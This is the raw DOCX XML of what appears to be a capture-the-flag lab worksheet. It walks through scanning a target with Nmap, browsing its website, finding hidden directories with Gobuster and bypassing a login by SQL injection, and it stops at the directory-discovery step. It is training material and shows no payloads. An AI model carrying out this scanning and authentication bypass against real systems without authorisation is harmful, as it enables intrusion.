          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>t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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Au</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve">hority, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>le</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>s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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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O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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>b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je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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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i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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>v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e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="1099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Identify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xp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ed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ervi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on a target system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u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4"/>
          <w:szCs w:val="24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ng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 xml:space="preserve"> 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an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ing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and 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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>u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m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ra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ion te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hnique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. Disc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4"/>
          <w:szCs w:val="24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ver a hidden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w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eb d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re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tory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and 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xp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loit a login vul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ra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b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ili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y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4"/>
          <w:szCs w:val="24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o gain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y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our i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it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4"/>
          <w:szCs w:val="24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al foothold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and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p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ture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the fir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t fl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g.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>T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o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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ls &amp; T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hn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iqu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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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 xml:space="preserve">s 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Y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ou’</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>l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 xml:space="preserve">l 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>U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se</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="144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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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p –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un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over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op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CP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po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on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he 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erimet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r</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/>
        <w:ind w:left="144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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Fire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x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br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ow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er –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o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y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pr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obe a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w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si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</w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="51"/>
        <w:ind w:left="144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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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G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ob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er –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 b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ute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-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or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hi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en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web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cto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ies</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/>
        <w:ind w:left="144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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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nu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l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Q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L Inj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ct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–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y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ss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ut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enti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ion</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="19" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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S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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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ep-b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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>y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-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>S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 xml:space="preserve">tep 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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>In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st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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>u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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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t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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i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ons</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="14" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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1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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Port</w:t>
      </w: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 xml:space="preserve">an the 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>T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arget</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="180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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Log in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o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K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li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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>li /</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-3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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="20"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Open 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ermi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l</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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un the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ollow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ng c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ma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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>nmap &lt;target_IP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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ec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ny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open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or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y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u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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="11020"/>
        </w:tabs>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Open po</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>rt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:position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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EC54F0">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>80 (http)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440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2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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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>B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ro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>ws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 xml:space="preserve">e the </w:t>
      </w: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T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 xml:space="preserve">arget </w:t>
      </w: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W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ebsite</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="1800" w:right="8872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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Open Fi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ox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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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v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igate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o:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>http://&lt;target_IP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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Wh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is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y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our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ini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l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ss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ment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si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’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on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 or c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nten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?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="11100"/>
        </w:tabs>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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808080"/>
          <w:position w:val="-1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808080"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1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color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ser</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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808080"/>
          <w:spacing w:val="-1"/>
          <w:position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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>io</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007B3087">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>Website with Login Page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="12" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440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3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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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 xml:space="preserve">Discover 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>H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id</w:t>
      </w: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d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en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Dire</w:t>
      </w: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t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
